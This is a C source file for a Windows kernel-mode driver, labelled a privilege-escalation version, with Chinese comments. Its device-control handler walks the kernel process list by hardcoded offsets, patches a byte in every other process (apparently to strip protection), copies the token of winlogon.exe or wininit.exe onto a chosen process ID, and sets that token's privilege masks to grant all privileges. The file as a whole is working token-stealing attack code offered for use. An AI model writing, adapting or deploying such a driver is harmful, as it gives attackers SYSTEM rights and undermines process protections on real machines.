// MyDriver.c - Kernel-Mode Driver (Privilege Escalation Version)
#include <ntifs.h>
#include <wdm.h>
#include <ctype.h>
#include <ntddk.h>

// =======================================================================
//   1. 將所有自訂的結構定義和 IOCTL 放在檔案頂部
// =======================================================================

// 自訂 _SEP_TOKEN_PRIVILEGES 結構定義
// 因為這個結構不是公開的，我們需要自己定義它
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONGLONG Present;
    ULONGLONG Enabled;
    ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

// IOCTL 定義
#define IOCTL_EXECUTE_MEMORY_OP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

EXTERN_C NTKERNELAPI PEPROCESS NTAPI PsGetNextProcess(
    _In_opt_ PEPROCESS Process
);

// 傳遞資料的結構定義
typedef struct _KERNEL_OP_REQUEST {
    ULONG ProcessId;
} KERNEL_OP_REQUEST, * PKERNEL_OP_REQUEST;



int stricmp1(const char* s1, const char* s2) {
    unsigned char c1, c2;
    while (*s1 && *s2) {
        c1 = (unsigned char)tolower((unsigned char)*s1);
        c2 = (unsigned char)tolower((unsigned char)*s2);
        if (c1 != c2) {
            return c1 - c2;
        }
        s1++;
        s2++;
    }
    return (unsigned char)tolower((unsigned char)*s1) -
        (unsigned char)tolower((unsigned char)*s2);
}

const char* names[] = {
    "service.exe",
    "wininit.exe",
    "winlogon.exe"
};
size_t nameCount = sizeof(names) / sizeof(names[0]);

// =======================================================================
//   2. 驅動程式的函式實作
// =======================================================================

// --- DriverUnload (如果有的話，可以放在這裡) ---
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Unloaded\n"));
}

// DeviceControl 函式
// 常見的 offset (Windows 10 x64)
// 注意：不同 build 可能不同，請用 WinDBG !process 驗證
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET 0x1d8  
#define EPROCESS_UNIQUEPROCESSID_OFFSET    0x1d0  
#define TOKEN_OFFSET 0x248
#define PRIVILEGES_OFFSET 0x40
#define EPROCESS_IMAGEFILENAME_OFFSET 0x338

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG bytesIO = 0;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_EXECUTE_MEMORY_OP) {
        PKERNEL_OP_REQUEST req = (PKERNEL_OP_REQUEST)Irp->AssociatedIrp.SystemBuffer;

        // --- 原本：只處理輸入 PID ---
        PEPROCESS targetProcess = NULL;
        status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess);

        // --- 新增功能：ActiveProcessLinks 遍歷所有 EPROCESS ---
        PEPROCESS pCurrent = PsGetCurrentProcess(); // 任意一個 process 當起點
        PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pCurrent + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
        PLIST_ENTRY head = pList;

        do {
            PEPROCESS curr = (PEPROCESS)((PUCHAR)pList - EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
            ULONG pid = *(ULONG*)((PUCHAR)curr + EPROCESS_UNIQUEPROCESSID_OFFSET);

            if (pid != req->ProcessId) { // 排除輸入 PID
                __try {
                    *((PUCHAR)curr + 0x5FA) = 0; // eb (EPROCESS+0x5FA) 0
                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                        "[MyDriver] Patched process 0x%p (PID %lu)\n", curr, pid));
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                        "[MyDriver] Patch failed for PID %lu\n", pid));
                }
                char* imageName = (char*)((PUCHAR)curr + EPROCESS_IMAGEFILENAME_OFFSET);
                for (size_t i = 0; i < nameCount; i++) {
                    if (0 == stricmp1(imageName, names[i])) {
                        PEPROCESS pid4Process = NULL;
                        status = PsLookupProcessByProcessId((HANDLE)pid, &pid4Process);
                        if (!NT_SUCCESS(status)) {
                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] 找不到 PID 4\n"));
                            break;
                        }
                        PACCESS_TOKEN pid4Token = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)pid4Process + TOKEN_OFFSET));
                        pid4Token = (PACCESS_TOKEN)((ULONG_PTR)pid4Token & ~0xF);
                        if (!pid4Token) {
                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] PID4 Token 找不到！\n"));
                            ObDereferenceObject(pid4Process);
                            break;
                        }

                        PEPROCESS targetProcess1 = NULL;
                        status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess1);
                        if (!NT_SUCCESS(status)) {
                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                                "[MyDriver] 找不到目標 PID %lu\n", req->ProcessId));
                            ObDereferenceObject(pid4Process);
                            break;
                        }

                        *(PULONG_PTR)((PUCHAR)targetProcess1 + TOKEN_OFFSET) = (ULONG_PTR)pid4Token;
                        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                            "[MyDriver] PID %lu 的 Token 指向 PID4 Token: 0x%p\n",
                            req->ProcessId, pid4Token));

                        
                        // 強制終止
                        /*
                        status = ZwTerminateProcess(pid4Process, STATUS_SUCCESS);
                        if (NT_SUCCESS(status)) {
                            DbgPrint("Process %d killed.\n", (ULONG)(ULONG_PTR)pid);
                        }
                        else {
                            DbgPrint("ZwTerminateProcess failed: 0x%X\n", status);
                        }

                        // 3. Deref，不然物件計數不會減
                        ObDereferenceObject(pid4Process);
                        */
                        break;
                    }
                }
            }
            

            pList = pList->Flink; // 下一個
        } while (pList != head); // 繞回來表示走完

        if (!NT_SUCCESS(status)) {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[MyDriver] PsLookupProcessByProcessId 失敗: 0x%X\n", status));
        }
        else {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "[MyDriver] 成功找到 PID %lu 的 EPROCESS: 0x%p\n",
                req->ProcessId, targetProcess));



            PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
            pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);

            if (!pToken) {
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                    "[MyDriver] 找不到 Token 物件！\n"));
                status = STATUS_NOT_FOUND;
            }
            else {
                PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                    "[MyDriver] 原始 Present: 0x%llX, Enabled: 0x%llX\n",
                    pPrivileges->Present, pPrivileges->Enabled));

                pPrivileges->Present = 0x0000001ff2ffffbc;
                pPrivileges->Enabled = 0x0000001ff2ffffbc;

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                    "[MyDriver] [SUCCESS] 權限已修改！\n"));
            }

            ObDereferenceObject(targetProcess);
        }

        

    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}



// DriverEntry 函式
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateDevice 失敗: 0x%X\n", status));
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateSymbolicLink 失敗: 0x%X\n", status));
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] =
        DriverObject->MajorFunction[IRP_MJ_CLOSE] =
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Loaded and Initialized\n"));
    return STATUS_SUCCESS;
}
